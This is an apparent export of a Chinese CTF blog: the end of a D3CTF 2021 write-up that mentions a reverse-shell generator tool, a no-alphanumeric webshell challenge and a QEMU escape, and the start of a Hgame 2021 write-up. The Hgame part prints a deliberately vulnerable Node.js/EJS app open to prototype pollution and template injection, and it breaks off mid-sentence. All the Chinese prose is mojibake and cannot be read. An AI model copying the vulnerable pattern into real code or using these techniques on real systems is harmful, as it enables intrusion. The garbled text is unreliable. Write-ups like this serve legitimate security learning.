</p><p>æ¯æ—¥ç½‘æ˜“äº‘ keep doctors away çš„ï¼Œç»™çš„æ˜¯ QUIC / HTTP3 çš„æµé‡åŒ…ï¼Œçœ‹ä¸Šå»åƒæ˜¯ m3u8 æ¨æµçš„æŠ“åŒ…ã€‚</p><p>å’Œå–µå–µæ˜¥èŠ‚é—¯å…³ Task2 çš„æ¨æµæœ‰ç‚¹åƒï¼ŒæŠ“äº†ä¸ªåŒ…å‘ç°ä¹Ÿç±»ä¼¼ã€‚</p><p>å…ˆåŠ è½½ SSLKEYLOGFILE å¾—åˆ°æ˜æ–‡æµé‡ï¼Œä½†æ˜¯ä¸ä¼šæå– QUICï¼Œå¤ªè‰äº†</p><p>å¯ä»¥å¯¼å‡º JSON ç„¶åå†™ä¸ªè„šæœ¬æå–çš„ï¼Œå‘œå‘œå‘œï¼Œæˆ‘æ˜¯fwï¼ˆï¼ˆï¼ˆ</p><blockquote><p>çœ‹äº†å®˜æ–¹ wpï¼Œè‰ï¼Œè¿™é¢˜è¿™ä¹ˆå¥—å¨ƒçš„ä¹ˆã€‚ï¼ˆ</p><p>æµé‡è§£å¯†å®Œæ˜¯åŠ å¯†çš„ m3u8 æµï¼Œæå–å‡ºå¯†é’¥ç”¨ aes-128-cbc è§£å¯†ï¼Œæ ¹æ®é¢‘è°±å‘ç°æ˜¯æ‹¨å·ä¸Šç½‘çš„è°ƒåˆ¶è§£è°ƒå™¨ï¼ˆmodemï¼‰ï¼Œè§£ç å®Œå¾—åˆ° base64 è§£å¯†å¾—åˆ°å‹ç¼©åŒ…ã€‚å†å»ç½‘æ˜“äº‘æ‰¾åˆ°ç›¸åŒæ­Œæ›²çš„æ­Œè¯ json è¿›è¡Œæ˜æ–‡æ”»å‡»ã€‚å¾—åˆ°çš„ txt æ–‡æ¡£å†…å®¹ç©ºç™½å­—ç¬¦éšå†™ï¼Œå† base85 è§£å¯†å¾—åˆ° flagã€‚</p></blockquote><p>BTWï¼Œè¿˜æ‰¾äº†ç‚¹ <strong>QUIC ç›¸å…³çš„å·¥å…·</strong>ã€‚</p><blockquote><p><a href="https://github.com/quicwg/base-drafts/wiki/Tools">a listing of tools</a> for analysing, debugging and visualising QUIC (and potentially the HTTP mapping). See also the <a href="https://github.com/quicwg/base-drafts/wiki/Implementations">Implementations listing</a>.</p><p><a href="https://qvis.edm.uhasselt.be/"><strong>qvis</strong></a> â€”â€” Toolsuite for visualizing QUIC+HTTP/3 qlog and pcap files. Includes a  sequence diagram, congestion graph, multiplexing diagram and  packetization visualization. ä¸€ä¸ª QUIC+HTTP/3 å¯è§†åŒ–çš„å·¥å…·ã€‚ï¼ˆ<a href="https://github.com/quiclog/qvis">GitHub</a>ï¼‰</p></blockquote></li><li><p>æœ‰ä¸€é¢˜ shellgen2</p><p>æ˜¯è¾“å…¥ Python ä»£ç ï¼Œè¾“å‡º PHPã€‚éªŒè¯é€»è¾‘æ˜¯éšæœºäº§ç”Ÿä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ‰§è¡Œ Python ä»£ç å¾—åˆ° PHP ä»£ç ï¼Œç„¶åç»è¿‡ waf ä¹‹åå†æ‰§è¡Œ PHPã€‚è²Œä¼¼ä¸ªé™åˆ¶é•¿åº¦çš„ <strong>æ— å­—æ¯æ•°å­— webshell</strong>ã€‚</p><p>ï¼ˆå–µå–µè¿·èŒ«</p><blockquote><p>BTWï¼Œ<a href="https://github.com/t0thkr1s/revshellgen"><strong>revshellgen</strong></a><br>Standalone script written in Python 3 for generating reverse shells easily without typing. It automates the boring stuff like URL encoding the command and setting up a listener.<br>ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆå¤šç§è¯­è¨€çš„åå¼¹ shell çš„å·¥å…·ï¼Œè¿˜èƒ½åŒæ—¶æ‰“å¼€ç«¯å£ç›‘å¬ã€‚</p></blockquote></li><li><p>etc.</p></li></ul><p>è¢«å¡ä½å¤ªéš¾å—äº†ï¼Œä¹‹åæœ‰ç©ºæœ‰æœºä¼šå†æ¥å¤ç°å§ã€‚</p><p>Pwn æœ‰é¢˜ QEMU é€ƒé€¸çš„ï¼Œå–µå–µä» misc çš„è§’åº¦æ¥çœ‹çš„ã€‚</p><p>é¢˜ç›®åœ¨ docker é‡Œæ­äº†ä¸ª QEMU è™šæ‹Ÿæœºã€‚flag åœ¨ docker é‡Œçš„ï¼ˆç›¸å¯¹äºè™šæ‹Ÿæœºçš„ï¼‰ host é‡Œï¼Œè¿æ¥å‘ç°é€šè¿‡ <code>Ctrl-A C</code> å¯ä»¥é€€å‡ºè™šæ‹Ÿæœºåˆ° monitorï¼ŒæŠŠ flag ä½œä¸ºå…‰é©±æŒ‚è½½ä¸Šå»ï¼Œä½† <code>Ctrl-A C</code> å†è¿›å»å‘ç°è¯»ä¸å‡ºæ¥ï¼Œçœ‹åˆ«äºº wp å‘ç°éœ€è¦å¾€è¿™ä¸ªé‡Œé¢å…ˆå†™å…¥å…¶ä»–å­—ç¬¦ä¸²ï¼Œè¶³å¤Ÿé•¿æ‰èƒ½è¾“å‡ºã€‚ç„¶è€Œæœ‰ç‚¹é—®é¢˜è¿™ä¹ˆæ‰“æ²¡æ‰“é€šï¼Œæœ€åé˜Ÿå‹ç”¨ binary çš„æ–¹æ³•æ‰“é€šäº†ï¼Œ233333.</p><p><strong>å¤ªé¡¶äº†å¤ªé¡¶äº†ï¼</strong></p><p>å–µå‘œå‘œå‘œå‘œå‘œï¼Œæˆ‘åªä¼šç­¾åˆ°ã€é—®å·å’Œè¿™é“æ¥æ¥å›å›çš„è™šæ‹Ÿæœºäº†â€¦â€¦</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308011058489.png"></p><p>æŒ¤ä¸è¿›å‰20äº†ï¼Œå–µå–µå¤§å“­ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308011138649.png"></p><p>ä¸è¿‡æ‹¿äº†ä¸ªä¸€è¡€è¿˜æ˜¯æŒºçˆ½çš„ï¼</p><p>ä¸å¯¹åŠ²ï¼Œæœ¬æ¥è¯´ç€éšæ„å†™å†™çš„ï¼Œæ€ä¹ˆæ‰¯äº†è¿™ä¹ˆå¤šï¼ˆ</p><p><em>ï¼ˆæºœäº†æºœäº†</em></p><hr><p>å™¢ï¼ŒOfficial Writeup ç»ˆäºå‡ºæ¥äº†ï¼</p><p><a href="https://github.com/D-3CTF/D3CTF-2021-Official-Writeup">https://github.com/D-3CTF/D3CTF-2021-Official-Writeup</a></p><!--### Happy_Valentine's_Day> This is a romantic love letterğŸ’Œ, can you find the secret hidden in the letter?> Note: The server is reset every 10 minutes, please do not make any  changes or damage to the environment after getting the flag. > **Please do not bruteforce or scan this challenge.** > **Flag Format: d3ctf{this_is_a_sample_flag}**>> http://0aadb50322.lovely.d3ctf.io ![](CTF_2021Ant-D3CTF/image-20210307024409056.png)JAVA Spring æ¨¡æ¿æ³¨å…¥-->]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 Hgame Week4 WriteUp</title>
      <link href="2021/03/04/CTF_2021HgameWeek4/"/>
      <url>2021/03/04/CTF_2021HgameWeek4/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p><strong>Hgame 2021 Week 4</strong></p><p>å–µå‘œï¼Œè½¬çœ¼é—´ Hgame å°±åˆ°äº†æœ€åä¸€å‘¨ï¼Œå¯’å‡ä¹Ÿç»“æŸäº†ã€‚</p><p>è¿™å‘¨é¢˜ç›®å¥½éš¾å•Šï¼Œè¿˜æœ‰å°±æ”¶å‡äº†æ¯”è¾ƒå¿™ï¼Œåé¢å°±æ²¡æ—¶é—´çœ‹é¢˜äº†ã€‚</p><p>é—®é¢˜ä¸å¤§<em>ï¼ˆå–µå–µçˆ¬èµ°</em></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥"><a href="#æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥" class="headerlink" title="æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥"></a>æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥</h3><blockquote><p>åœ¨æˆ‘é•¿å¤§çš„è¿™ä¸ªåŸå¸‚é‡Œï¼Œæ¯ä¸ªäººéƒ½æœ‰è¶…è¶Šå¯»å¸¸çš„ç‰¹é•¿ã€‚æˆ‘å¯ä»¥é‡å¯è¿™ä¸ªä¸–ç•Œï¼ˆæ˜¯çš„æ•´ä¸ªä¸–ç•Œï¼‰ï¼Œä¸ä»…ä»…æ˜¯å°†æ—¶é’Ÿå¾€å›æ‹¨ï¼Œè€Œæ˜¯å°†ä¸–ç•Œçš„ä¸€åˆ‡ï¼Œä»åŸå­å±‚é¢æ¢å¤åˆ°ä¸€å¤©å‰çš„çŠ¶æ€ã€‚åªæœ‰çœ‹åˆ°æœ‰äººåœ¨å“­æ³£æ—¶ï¼Œæˆ‘æ‰ä¼šé‡å¯ã€‚åŒ…æ‹¬æˆ‘çš„è®°å¿†ï¼Œå…¨éƒ¨é‡å¯ã€‚ä½†æ˜¯ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œæˆ‘çš„æ­æ¡£æœ‰ç»å¯¹è®°å¿†ã€‚<br> ç„¶è€Œï¼Œæˆ‘ä»¬è¢«å›°åœ¨äº†è¿™ä¸€å¤©é‡Œï¼Œæ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥ã€‚æœ‰æƒ…æŠ¥è¯´ï¼Œåªè¦æˆ‘ä»¬é‡å¯äº†è¿™ä¸€å¤©ï¼Œâ€œMacGuffinâ€ ä¾¿ä¼šå‡ºç°åœ¨æˆ‘ä»¬é¢å‰ï¼Œå¹¶ä¸”å®ƒä¼šæ»¡è¶³æˆ‘ä»¬çš„ä»»ä½•æ„¿æœ›ã€‚</p><p><a href="http://macguffin.0727.site:5000/">http://macguffin.0727.site:5000/</a> </p></blockquote><p>æç¤ºæœ‰æºç ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221173405858.png"></p><p>ä¸‹è½½ä¸‹æ¥ä¸€çœ‹ï¼Œå•Š NodeJSï¼Œå¥½è€¶ï¼</p><p><code>app.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    name<span class="token operator">:</span> <span class="token string">'session'</span><span class="token punctuation">,</span>    secret<span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'aA0'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    resave<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    saveUninitialized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span> discription<span class="token operator">:</span> <span class="token string">""</span> <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip <span class="token operator">===</span> <span class="token string">"::ffff:127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        data<span class="token punctuation">.</span>crying <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">!==</span> <span class="token string">"crying"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                data<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>key<span class="token punctuation">]</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>crying <span class="token operator">=</span> data<span class="token punctuation">.</span>crying        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>name <span class="token operator">=</span> data<span class="token punctuation">.</span>name        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>discription <span class="token operator">=</span> data<span class="token punctuation">.</span>discription        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token string">'/show'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'loop'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/show'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>name <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>discription<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> wishes <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>wishes <span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>wishes <span class="token operator">:</span> <span class="token string">""</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'show'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        name<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>name<span class="token punctuation">,</span>        discription<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>discription<span class="token punctuation">,</span>        wishes<span class="token operator">:</span> wishes    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/wish'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>crying<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"forbidden."</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> wishes <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>wishes        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>wishes <span class="token operator">=</span> ejs<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div class="wishes"&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>wishes<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token string">'/show'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'wish'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">App start on port 3000!</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>show.ejs</code></p><pre class="language-ejs" data-language="ejs"><code class="language-ejs"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/css/show.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>SHOW<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main-box<span class="token punctuation">"</span></span> <span class="token attr-name">translate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-card<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__article<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">--animation-order</span><span class="token punctuation">:</span>1</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__link<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__content articles__content--lhs<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                                <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> discription </span><span class="token delimiter punctuation">%&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__footer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>                                    <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> name </span><span class="token delimiter punctuation">%&gt;</span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__content articles__content--rhs<span class="token punctuation">"</span></span> <span class="token attr-name">aria-hidden</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                                <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> discription </span><span class="token delimiter punctuation">%&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>articles__footer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>                                    <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> name </span><span class="token delimiter punctuation">%&gt;</span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">&gt;</span></span>            <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%</span><span class="token language-javascript"> <span class="token keyword">if</span> <span class="token punctuation">(</span>wishes<span class="token punctuation">)</span> <span class="token punctuation">{</span> </span><span class="token delimiter punctuation">%&gt;</span></span>                <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%-</span><span class="token language-javascript"> wishes </span><span class="token delimiter punctuation">%&gt;</span></span>                    <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%</span><span class="token language-javascript"> <span class="token punctuation">}</span> </span><span class="token delimiter punctuation">%&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/js/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><p>æ³¨æ„åˆ°å¤„ç† <code>/</code> è·¯ç”±çš„æ—¶å€™ï¼ŒæŠŠ <code>body</code> é‡Œé™¤äº† <code>crying</code> çš„ä¸œè¥¿éƒ½èµ‹å€¼ç»™ <code>data</code> äº†ï¼Œäºæ˜¯æƒ³åˆ°æ˜¯ <strong>åŸå‹é“¾æ±¡æŸ“</strong> ã€‚</p><p>å›æ˜¾çš„è¯å¯ä»¥é€šè¿‡è¿™ä¸ª <code>wishes</code> æ¥è¿›è¡Œã€‚</p><p>éšæ„å‘ä¸ªåŒ…ï¼Œå¯ä»¥å‘ç°ç”¨çš„æ˜¯ 